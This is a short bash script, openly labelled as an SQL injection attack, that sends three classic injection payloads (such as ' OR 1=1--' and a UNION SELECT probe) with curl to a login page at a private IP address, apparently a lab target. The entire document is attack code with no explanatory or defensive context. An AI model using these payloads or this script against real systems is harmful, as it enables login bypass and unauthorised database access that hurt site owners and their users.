#!/bin/bash

TARGET="http://10.30.141.95/login.php"

echo "[*] Running SQL Injection Attack..."

payloads=(
"' OR 1=1--"
"' UNION SELECT NULL--"
"' OR 'a'='a"
)

for p in "${payloads[@]}"
do
    echo "[+] Trying payload: $p"
    curl "$TARGET?q=$p"
    sleep 1
done